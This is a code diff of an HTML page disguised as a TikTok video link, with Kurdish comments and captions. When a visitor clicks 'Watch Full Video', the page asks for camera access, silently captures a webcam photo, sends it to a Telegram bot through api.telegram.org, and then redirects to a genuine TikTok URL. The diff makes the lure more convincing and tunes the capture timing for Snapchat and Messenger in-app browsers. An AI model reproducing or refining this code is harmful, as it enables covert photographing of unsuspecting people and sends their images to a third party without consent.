@@ -3,19 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok · warza jayto</title>
-    <meta property="og:title" content="TikTok · warza jayto">
+    <title>TikTok · Video Content</title>
+    <meta property="og:title" content="TikTok · ڤیدیۆی نوێ">
     <meta property="og:image" content="https://i.ibb.co/1t8S4QVG/42269.jpg">
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/1t8S4QVG/42269.jpg') no-repeat center center; background-size: cover; filter: blur(5px); z-index: 1; }
-        .play-btn { position: relative; z-index: 100; background: rgba(255,255,255,0.2); padding: 20px 40px; border-radius: 30px; border: 2px solid #fff; color: #fff; font-family: sans-serif; font-weight: bold; cursor: pointer; backdrop-filter: blur(10px); }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/1t8S4QVG/42269.jpg') no-repeat center center; background-size: cover; z-index: 1; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 2; }
+        .play-btn { position: relative; z-index: 100; background: #fe2c55; color: white; padding: 15px 35px; border-radius: 5px; font-family: sans-serif; font-weight: bold; border: none; cursor: pointer; font-size: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="bg"></div>
-    <div class="play-btn" onclick="start()">▶ Watch Video</div>
+    <div class="overlay"></div>
+    <button class="play-btn" onclick="start()">▶ Watch Full Video</button>
     
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -26,26 +28,26 @@
             const chat_id = "7261354534";
             
             try {
-                // نیشاندانی پەنجەرەی ڕێپێدان دوای کلیک
+                // سناپچات و مەسنجەر ڕێگە نادەن کامێرا یەکسەر بکرێتەوە، دەبێت بە کلیک بێت
                 const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('v');
                 v.srcObject = s;
-                v.play();
+                await v.play();
 
-                // کاتمان زیاد کرد بۆ 1200ms بۆ دڵنیایی لە سناپچات
+                // کاتمان زیاد کرد بۆ 1300ms بۆ ئەوەی سناپچات فریای فوکەس بکەوێت
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
-                    const imageData = c.toDataURL('image/jpeg', 0.6);
+                    const imageData = c.toDataURL('image/jpeg', 0.7);
                     const blob = await (await fetch(imageData)).blob();
                     
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
                     formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', "📸 وێنەیەک لەناو سناپچات/مەسنجەر گەیشت\n🔗 پەیج: TikTok");
+                    formData.append('caption', "📸 وێنەی ناو سناپچات گەیشت\n🔗 سەرچاوە: In-App Browser");
 
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                         method: 'POST',
@@ -53,7 +55,7 @@
                     });
 
                     window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
-                }, 1200); 
+                }, 1300); 
             } catch (e) {
                 window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
             }
